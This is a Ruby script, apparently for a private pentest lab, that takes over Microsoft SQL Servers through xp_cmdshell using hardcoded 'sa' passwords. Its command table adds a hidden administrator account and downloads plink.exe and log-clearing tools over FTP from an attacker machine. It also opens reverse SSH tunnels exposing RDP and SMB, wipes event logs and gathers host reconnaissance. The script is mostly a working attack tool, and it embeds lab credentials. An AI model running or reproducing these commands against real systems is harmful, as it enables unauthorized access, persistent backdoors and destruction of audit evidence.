require 'tiny_tds'
require 'rails'

class XpCmdShell

  def initialize h


# lab
    @lab = {
           :lab1 => {
               :os => 'WINXP',
               :user => 'Administrator',
               :pass => '!dowN09',
               :location => 'Notebook',
               :role => 'PENTEST',
               :ip => '192.168.228.45',
               :ssh => {:user => 'ssh_account',
                        :pass => 'ssh_pass',
                        :port => '22',
               },
               :ftp => {:user => 'ftp_user',
                        :pass => 'ftp_pass',
                        :port => '21',
               },
           },
           :lab2 => {
               :os => 'WINXP',
               :user => 'user', #Administrator
               :pass => 'user_pass', #lunch701
               :location => 'NOTEBOOK',
               :role => 'TARGET',
               :ip => '192.168.228.50',
               :mssql => {:version => '2005',
                          :user => 'sa',
                          :pass => 'SYSADM',
                          :port => '1035',
                        },
            },
           :lab3 => {
               :os => 'WIN 7',
               :user => 'Administrator',
               :pass => 'WINPRO701',
               :location => 'macmini',
               :role => 'TARGET',
               :ip => '192.168.288.58',

           },
           :lab4 => {
               :os => 'WINXP',
               :user => 'Administrator',
               :pass => 'WINXP_PRO701',
               :location => 'MACMINI',
               :role => 'TARGET',
               :ip => '192.168.228.59',
               :mssql => {:version => '2005',
                          :user => 'sa',
                          :pass => 'LUNCH701',
                          :port => '1214'
               },
           },
           :lab5 => {
               :os => 'Debian - linux',
               :user => 'debian',
               :pass => 'lunch701',
               :location => 'notebook',
               :role => 'PENTEST',
               :ip => '192.168.228.55',
               :ssh => {:user => 'user',
                        :pass => 'user_pass',
                        :port => '22',
               }

           },
    }



    case h[:ssh]

      when  'lab1' then
        @ssh_ip = @lab[:lab1][:ip]
        @ssh_port = @lab[:lab1][:ssh][:port]
        @ssh_user = @lab[:lab1][:ssh][:user]
        @ssh_pass = @lab[:lab1][:ssh][:pass]


      when 'lab5' then

        @ssh_ip = @lab[:lab5][:ip]
        @ssh_port = @lab[:lab5][:ssh][:port]
        @ssh_user = @lab[:lab5][:ssh][:user]
        @ssh_pass = @lab[:lab5][:ssh][:pass]
      end




    case h[:ftp]

      when 'lab1' then
        @ftp_ip = @lab[:lab1][:ip]
        @ftp_pass = @lab[:lab1][:ftp][:pass]
        @ftp_user = @lab[:lab1][:ftp][:user]
        @FTP_PORT = @lab[:lab1][:ftp][:port]

      when 'lab5' then
        @ftp_ip = @lab[:lab5][:ip]
        @ftp_pass = @lab[:lab5][:ftp][:pass]
        @ftp_user = @lab[:lab5][:ftp][:user]
        @FTP_PORT = @lab[:lab5][:ftp][:port]

    end



    case h[:mssql]

      when 'lab2'

        @sql_user = @lab[:lab2][:mssql][:user]
        @sql_pass = @lab[:lab2][:mssql][:pass]
        @sql_ip   = @lab[:lab2][:ip]
        @sql_port = @lab[:lab2][:mssql][:port]

      when 'lab4'
        @sql_user = @lab[:lab4][:mssql][:user]
        @sql_pass = @lab[:lab4][:mssql][:pass]
        @sql_ip   = @lab[:lab4][:ip]
        @sql_port = @lab[:lab4][:mssql][:port]


    end


    case h[:plink]

      when 'lab2'
        @target_ip_3389 = @lab[:lab2][:ip]
        @TARGET_IP_445 = @lab[:lab2][:ip]
      when 'lab4'
        @target_ip_3389 = @lab[:lab4][:ip]
        @TARGET_IP_445 = @lab[:lab4][:ip]
    end


#Fake user forget Win box
    @win_user = 'hx0r'
    @win_pass = 'pass'


#SQL hash

    @SQLHASH = {
        :makeCmdShellActive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        ],
        :makeCmdShellInactive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
        ],
        :createWin => [
            "EXEC xp_cmdshell 'net user /add #{@win_user} #{@win_pass}'", # login: user  password: pass
            "EXEC xp_cmdshell 'net localgroup administrators #{@win_user} /add'"
        ],
        :makeUserActive =>[
            "EXEC xp_cmdshell 'NET USER #{@win_user} /DOMAIN /ACTIVE:YES'"],
        :makeUserInActive =>[
            "EXEC xp_cmdshell 'NET USER #{@win_user} /DOMAIN /ACTIVE:NO'"],
        :delWinUser => [
            "EXEC xp_cmdshell 'net user #{@win_user} /del'"],
       :tree => [
            "EXEC xp_cmdshell 'tree c:\\'"],
        :ftpGetPlink => [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get plink.exe plink.exe.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren plink.exe.txt plink.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearEv=> [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearev.vbs clearev.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo get cleanafterme.exe cleanafterme.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearev.txt clearev.vbs'",
            "EXEC xp_cmdshell 'ren cleanafterme.txt cleanafterme.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearSSH => [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearSSH.vbs clearSSH.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearSSH.txt clearSSH.vbs'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :forward_3389_to_3388 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 3388:#{@target_ip_3389}:3389 #{@ssh_ip}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'",
            ],

        :forward_445_From_445 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 445:#{@target_ip_3389}:445 #{@ssh_ip}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'"
        ],
        :doClearEv => [
            "EXEC xp_cmdshell 'cscript clearev.vbs'",
        ],
        :doWinRestart => [
            "EXEC xp_cmdshell 'shutdown -r -f -t 2'", # force restart in 2 seconds
            "EXEC xp_cmdshell 'cscript clearev.vbs'"
        ],
        :tasklist => [ #show all running processes
            "EXEC xp_cmdshell 'tasklist'"
        ],
        :taskkill => [
            "EXEC xp_cmdshell 'taskkill /pid 576 /f'" #change the pid when you have run tasklist
        ],
        :ipconfig => [
            "EXEC xp_cmdshell 'ipconfig'"
        ],
        :scrape => [
            "EXEC xp_cmdshell 'net users'",
            "EXEC xp_cmdshell 'net start'",
            "EXEC xp_cmdshell 'net use'",
            "EXEC xp_cmdshell 'netstat -ano '",
            "EXEC xp_cmdshell 'tasklist'",
            "EXEC xp_cmdshell 'arp -a'",
            "EXEC xp_cmdshell 'ipconfig /all'",
            "EXEC xp_cmdshell 'set'",
            "EXEC xp_cmdshell 'systeminfo'",
       ],
    }
  end



  def doCmd(cmdArr)

    begin

      client = TinyTds::Client.new(:username => @sql_user, :password => @sql_pass, :host => @sql_ip, :port => @sql_port)
       cmdArr.each do |key|
         puts "[+] plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 3388:#{@target_ip_3389}:3389 #{@ssh_ip}'"
         puts "[+] " + key.to_s
         lineArr = @SQLHASH[key]
         lineArr.each do |line|
            result = client.execute(line)
            result.each do |row|
             puts row.to_s[12..-3]
            end
         end
        puts ""
       end
    rescue Exception => e
      puts e.message
      exit
     # puts e.backtrace.inspect
    end
  client.close
  end

end

xp = XpCmdShell.new  ({:ssh => 'lab1', :ftp=> 'lab1',:mssql=> 'lab2',:plink=> 'lab2'})
#xp.doCmd([:forward_3389_to_3388])
xp.doCmd([:ipconfig])



